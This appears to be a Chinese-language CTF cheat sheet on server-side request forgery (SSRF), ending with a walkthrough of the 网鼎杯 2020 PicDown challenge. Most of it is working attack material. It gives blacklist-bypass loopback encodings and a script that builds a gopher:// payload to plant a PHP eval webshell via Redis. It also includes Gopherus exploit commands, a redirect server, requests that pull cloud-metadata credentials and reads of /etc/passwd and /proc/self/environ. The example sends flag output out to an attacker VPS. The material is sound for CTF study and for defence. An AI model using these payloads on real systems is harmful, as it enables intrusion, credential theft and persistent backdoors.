# SSRF 服务端请求伪造

关键词：SSRF 服务端请求伪造 内网探测 gopher redis MySQL 云元数据 169.254.169.254 127.0.0.1绕过 302跳转

## ① 识别指纹

- 参数长这样：`?url=`、`?image=`、`?link=`、`?site=`、`?path=`、`?share=`、`?target=`、`?callback=`
- 功能是"服务端去取"：图片下载/在线预览、网页截图、收藏链接、远程导入、PDF 生成、翻译、Webhook 回调
- 题干出现 **"内网"、"后端"、"帮我访问"、"admin 只能本地访问"、"flag 在 127.0.0.1"**
- 附件源码里有 `requests.get(url)`、`urllib.urlopen`、`file_get_contents($url)`、`curl_exec`、`http.Client`、`HttpClient`
- 题目给了两个服务：一个对外，一个只监听 `127.0.0.1`（常见于 docker-compose 环境）
- 题目名带 SSRF / 内网 / 图片预览 / 代理
- 目标在云上：题干提到容器、ECS、腾讯云、阿里云 → 云元数据题
- 上传点存在"从 URL 导入"选项 → 与 [/web/file-upload](/web/file-upload) 交叉

## ② 考什么

- 协议支持范围：`http` / `https` / `file` / `dict` / `gopher` / `ftp` / `ldap`
- 内网探测：主机存活、端口开放、服务指纹
- 回环地址的等价写法与黑名单绕过
- 302 跳转绕过（服务端跟随重定向）
- DNS rebinding（域名解析两次给不同 IP）
- URL 解析差异：userinfo `@`、`#`、反斜杠、大小写、末尾点号
- `gopher://` 打 Redis（写 webshell / 写 crontab / 主从复制）
- `gopher://` 打 MySQL、FastCGI（手工构造二进制协议包）
- 云元数据 `169.254.169.254` / `100.100.100.200`，拿临时凭证
- 文件协议读源码、`/proc/self/*` 定位工作目录与进程信息
- 盲 SSRF：只靠响应时间与错误信息判定
- 与文件读取、反序列化、内网服务的组合链

## ③ 判断流程

> 先确认"请求真的是服务端发出的"，再谈打什么。这一步错了，后面全白做。

1. **确认服务端请求**：把参数值换成 `http://YOUR_IP:8000/`，在自己 VPS 上 `nc -lvnp 8000` 观察 → 收到请求（含源 IP、UA）→ 确认 SSRF，进 2；一分钟内没有请求 → 进 8
2. **看回显形态**：请求 `http://127.0.0.1:80/` 后页面显示响应体 → 有回显 SSRF，进 3；只显示"成功/失败"或只有耗时 → 盲 SSRF，进 7
3. **试 `file://`**：`url=file:///etc/passwd` → 回显文件内容 → 拿到任意文件读取，直接读源码、配置和 `/flag`，结束；报错或被拦 → 进 4
4. **读源码**：`url=/proc/self/cwd/app.py`、`url=/proc/self/cmdline`、`url=php://filter/convert.base64-encode/resource=/var/www/html/index.php` → 读到源码就看清过滤规则与真实服务地址，进 5；三种都读不到 → 进 9
5. **测本机可达性**：`http://127.0.0.1/`、`http://localhost/`、`http://[::1]/` 逐个请求 → 至少一个能返回内容 → 进 6；三个都被拦 → 进 9
6. **扫内网端口**：对 `127.0.0.1` 的 `6379`(Redis)、`3306`(MySQL)、`9000`(FastCGI)、`11211`(Memcached)、`8080`、`5000` 逐个请求，按返回内容/报错/耗时判断开放 → 命中非 HTTP 服务进 11；只开了 Web 端口 → 直接用 `http://` 访问该应用，进 13
7. **盲 SSRF 判定**：分别请求 `127.0.0.1:22`（关闭）与 `127.0.0.1:80`（开放），比较响应时间与状态码差异 → 有稳定差异 → 按差异扫描端口，进 6；无差异 → 进 8
8. **兜底**：以上都不成立 → 回到第 1 条，把同一组探测换到 POST body、Cookie、`X-Forwarded-Host`、`Referer`、文件名里再跑一遍；仍收不到请求 → 此题不是 SSRF，转 [/web/file-inclusion](/web/file-inclusion) 或 [/web/path-traversal](/web/path-traversal)
9. **黑名单绕过**：`127.0.0.1` 被拦 → 依次试 `127.1`、`127.0.0.1.`、`0.0.0.0`、`[::1]`、`[::ffff:127.0.0.1]`、`2130706433`、`0x7f000001`、`0177.0.0.1`、`127.0.0.1.nip.io`、`spoofed.burpcollaborator.net` → 有一个通过 → 回 3 重测；全部被拦 → 进 10
10. **302 跳转绕过**：黑名单只查参数里的字符串 → 在自己 VPS 上放一个 302 服务，跳转到 `http://127.0.0.1:<port>/`，让目标跟随重定向 → 回 3 重测；目标不跟随跳转 → 进 12
11. **选协议打服务**：目标是 Redis/MySQL/FastCGI 需要发二进制 → 用 `gopher://` 构造完整请求（见 ④）；只需要单条命令 → 用 `dict://127.0.0.1:6379/INFO` → 拿到数据或写入 webshell 即结束；协议失败 → 进 12
12. **云元数据**：目标在云主机/容器内 → 依次请求 `http://169.254.169.254/latest/meta-data/`（AWS/GCP）、`http://100.100.100.200/latest/meta-data/`（阿里云）、`http://metadata.tencentyun.com/latest/meta-data/`（腾讯云）→ 拿到 `ram/`、`instance-id` 或临时凭证即结束；三个都 404 → 进 13
13. **兜底**：以上都不成立 → 回到第 1 条，改用 `file://` 把 nginx 配置、`/proc/net/tcp`、`/proc/self/environ` 全部读出来，按真实服务与路径重新选分支

## ④ 工具与命令

```bash
# 0. 接收端：先证明请求从服务端发出，而不是你的浏览器
nc -lvnp 8000

# 1. 基础探测（注意参数是嵌套 URL，含 # ? 时要先 URL 编码）
curl -s "http://t.cn/api?url=http://127.0.0.1:80/"
curl -s "http://t.cn/api?url=file:///etc/passwd"

# 2. 读源码：PHP 用 filter 避免被 include 执行，Python 直接读裸路径
curl -s "http://t.cn/api?url=php://filter/convert.base64-encode/resource=/var/www/html/index.php" | base64 -d
curl -s "http://t.cn/api?url=/proc/self/cwd/app.py"
curl -s "http://t.cn/api?url=/proc/self/cmdline"

# 3. 端口探测：有回显时直接看内容，盲打时看耗时
for p in 22 80 3306 6379 8080 9000 11211; do
  echo -n "$p "; curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
    "http://t.cn/api?url=http://127.0.0.1:$p/"
done
```

```text
# 回环地址的等价写法（黑名单逐个试，顺序按成本）
127.0.0.1      127.1          127.0.0.1.      0.0.0.0
0x7f000001     2130706433     0177.0.0.1      [::1]
[::ffff:127.0.0.1]            127.0.0.1.nip.io
# userinfo 混淆：host 实际是 127.0.0.1，前面那截是用户名
http://evil.com@127.0.0.1/
```

```python
# gopher 打 Redis：写 webshell。RESP 长度用 len() 算，手写必错
import urllib.parse

def cmd(*args):
    out = f"*{len(args)}\r\n"
    for a in args:
        out += f"${len(a)}\r\n{a}\r\n"
    return out

payload = (
    cmd("flushall") +
    cmd("set", "x", "<?php eval($_POST[1]);?>") +
    cmd("config", "set", "dir", "/var/www/html") +
    cmd("config", "set", "dbfilename", "shell.php") +
    cmd("save")
)
print("gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload))
```

```bash
# 打 MySQL / FastCGI 用现成生成器，别手搓协议包
python2 Gopherus/gopherus.py --exploit mysql
python2 Gopherus/gopherus.py --exploit fastcgi

# 单条命令探测（有些实现只放行 dict）
curl -s "http://t.cn/api?url=dict://127.0.0.1:6379/INFO"
```

```python
# 302 跳转服务：放到公网 VPS 上跑，用来绕过只检查参数字符串的黑名单
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:6379/")
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

```bash
# 云元数据：三个厂商地址不同，按目标云厂商选
curl -s "http://t.cn/api?url=http://169.254.169.254/latest/meta-data/"        # AWS / GCP
curl -s "http://t.cn/api?url=http://100.100.100.200/latest/meta-data/"        # 阿里云
curl -s "http://t.cn/api?url=http://metadata.tencentyun.com/latest/meta-data/" # 腾讯云
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `127.0.0.1` 直接 403 | 黑名单做字符串匹配 | 换 `127.1`、十进制 `2130706433`、`[::1]`、`nip.io` |
| 传 `127.0.0.1` 没反应，传 `localhost` 有 | 过滤只匹配 IP 字面量 | 把所有等价写法反向再试一遍 |
| 内网端口全部超时 | 请求发出去了但结果不回显 | 用自己 VPS 做对照，先把盲 SSRF 的判定做出来 |
| `file://` 读不到文件 | 协议被禁或 `allow_url_fopen` 关闭 | 换 `php://filter`、`dict://`，或走 302 绕回 http |
| gopher 打 Redis 失败 | RESP 长度算错，或 Redis 有密码、开了 protected-mode | 用脚本生成 payload，先 `INFO` 确认免密 |
| 能进内网但拿不到 flag | flag 在另一个服务的接口里 | 先读源码/配置，找到真正的服务和路径 |
| 自己 VPS 收到的是浏览器 IP | 参数被前端直接 fetch，没走服务端 | 确认这是真 SSRF，换 POST 参数与 header 再试 |
| 云元数据 404 | 用错厂商地址 | AWS `169.254.169.254` / 阿里云 `100.100.100.200` / 腾讯云 `metadata.tencentyun.com` |

## ⑥ 例题

**题目**：`[网鼎杯 2020 白虎组] PicDown`
**来源**：BUUCTF 复现（原题出自 2020 网鼎杯 白虎组）
**题干**（大意）：一个图片下载服务，通过 `/page?url=` 让服务器去取指定地址的图片；flag 在服务器上。

**关键观察**：`url` 参数直接进入 Python2 的 `urllib.urlopen()`。该函数把**不以协议开头的字符串当作本地路径**，所以 `file://` 被过滤时，裸路径 `/etc/passwd` 反而能读。并且响应体直接回显在页面上 —— 有回显 SSRF。

**走了哪条链**：第 1 条（`url` 可控，服务端发起请求）→ 第 2 条（响应体回显）→ 第 3 条（`file://` 被拦，不进分支）→ 第 4 条（改读裸路径 `/proc/self/*`，拿到源码）→ 第 13 条（按源码找下一跳）。

**命令与输出**：

```bash
# 1. 确认工作目录与启动方式
curl -s "http://target/page?url=/proc/self/cmdline"
# 输出：python2\x00app.py\x00

curl -s "http://target/page?url=/proc/self/environ"
# 输出中可见：PWD=/app

# 2. 读源码，发现 SECRET_KEY 的读取逻辑
curl -s "http://target/page?url=/proc/self/cwd/app.py"
# 关键片段：SECRET_FILE=/tmp/secret.txt；读完 os.remove() 但 fd 没关

# 3. 文件已删，从文件描述符里捞回来
curl -s "http://target/page?url=/proc/self/fd/3"
# 输出：secret.txt 的原始内容，即 SECRET_KEY
```

**结果**：把 `SECRET_KEY` 带回管理接口 `/no_one_know_the_manager?key=...&shell=...`，命令执行处无回显，用 `curl` 把 `cat /flag | base64` 的结果外带到自己的 VPS。BUU 实例上还存在非预期解：`url=/flag` 直接读到。

::: tip flag 说明
flag 随实例生成，以原题平台为准。本题真正要带走的是三件事：**`?url=` 先证明请求源**、**`file://` 被拦时试裸路径**、**`/proc/self/*` 把源码与环境读出来**。gopher 打 Redis 的写法见 ④，属于同一类原语。
:::
